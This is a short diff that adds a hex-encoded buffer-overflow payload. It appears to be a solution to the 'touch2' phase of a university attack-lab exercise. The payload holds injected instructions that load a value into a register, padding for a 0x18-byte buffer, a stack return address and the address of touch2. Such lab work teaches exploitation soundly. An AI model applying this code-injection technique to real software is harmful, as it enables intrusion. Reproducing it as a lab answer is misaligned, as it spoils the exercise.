@@ -1,0 +1,11 @@
+48 c7 c7 10 76 a6 11 c3
+
+/* buffer is 0x18 so pad the remaining with 00's */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* rsp - 0x18 */
+98 46 63 55 00 00 00 00
+
+/* address of touch2 */
+44 5a 55 55 55 55 00 00
